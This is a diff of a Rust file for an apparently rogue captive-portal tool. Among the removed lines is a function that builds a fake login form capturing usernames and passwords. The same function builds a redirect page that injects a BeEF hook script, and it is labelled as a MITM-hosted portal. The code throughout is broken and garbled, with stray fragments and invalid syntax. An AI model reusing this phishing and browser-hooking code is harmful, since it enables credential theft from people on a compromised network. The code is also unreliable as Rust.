@@ -28,9 +28,15 @@ cargo install +nightly racer
   Load all external "modules"
 */
 mod captive_portal_option_parser;
-// captive_portal_option_parse::parse_commandline_arguments();
-std::io::B
+// USE LIKE THIS captive_portal_option_parse::parse_commandline_arguments();
+
+extern crate scoped_threadpool;
+use scoped_threadpool::Pool;
 extern crate clap;
+// thread pool from documentation
+//use threadpool::ThreadPool;
+
+
 //Basic stuff
 use std::char;
 use std::thread;
@@ -54,39 +60,6 @@ fn termcolorprint(text_color, text ) -> io::Result<()> {
   stdout.set_color(ColorSpec::new().set_fg(Some(Color::text_color)))?;
   writeln!(&mut stdout, text)
 };
-
-
-/*HTML for the login*/
-//Add beef hook conditional to replace normal stuff with mean stuff
-/*
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <title>Hello!</title>
-  </head>
-  <body>
-    <h1>Hello!</h1>
-    <p>Hi from Rust</p>
-  </body>
-</html>
-*/
-
-/* Bad request response*/
-// add stuff here
-/*
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <title>Hello!</title>
-  </head>
-  <body>
-    <h1>Oops!</h1>
-    <p>Sorry, I don't know what you're asking for.</p>
-  </body>
-</html>
-*/
 
 
 // Some variables for static things
@@ -131,10 +104,27 @@ fn concat_print(text1 , text2){
     println("{}{}", text1 , text2)
 }
 
+fn thread_pool_execute(max_workers){
+    // Create a pool of worker threads
+    let mut pool = Pool::new( max_workers );
+    // This borrows the pool, and blocks until all threads are done.
+    pool.scoped( |scoped| {
+        filter_map(Result::ok) {
+            // Fire-off a worker thread and run the containing code in the scope of the pool. Does not block.
+            scoped.execute( move || {
+                some_action{
+            // Parse the result
+                    Ok() => {println!("", wat);},
+                    Err( err ) => {panic!("Error - {}", err );}
+
+            };
+        };
+    );
+};
 // add conditional to use ncurses output
 fn shutdown_server(){
     termcolorprint( "red", "SHUTTING DOWN");
-
+    //add stuff here
 };
 
 /* Setup http responder*/
@@ -205,42 +195,7 @@ returns a string containing the html needed to make wither a redirect or form wi
 
 */
 std::i128
-fn make_html( hook_loc,  redirect,  formaction, form_or_redirect) {
 
-    let html_redirect_body;
-
-    let html_form_body;
-
-    let hook_location = hook_loc;
-
-    let redirect_ip = redirect;
-
-    // build the form
-    let html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
-    let html_form_body_top = "<body><form class=\"login\" ";
-    let form_action = "action=\"" + formaction + "\" ";
-    let html_form_body_bottom = " method=\"post\">\
-        <input type=\"text\" name=\"username\" value=\"username\">\
-        <input type=\"text\" name=\"password\" value=\"password\">\
-        <input type=\"submit\" name=\"submit\" value=\"submit\">\
-        </form>\
-        </body>\
-        </html>";
-    // build the redirect
-    let html_redirect_head = "<html><head>";
-    let beef_hook = "<script src=" + hook_loc + "></script>";
-    let html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
-    let redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
-
-    // Determine if the user wants the form or the redirect
-    if form_or_redirect == true {
-        let html_redirect_body = std::concat!() html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
-        return html_redirect_body;
-    else if (form_or_redirect == false{
-        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
-        return html_form_body;
-    };
-};
 
 fn main()
 {
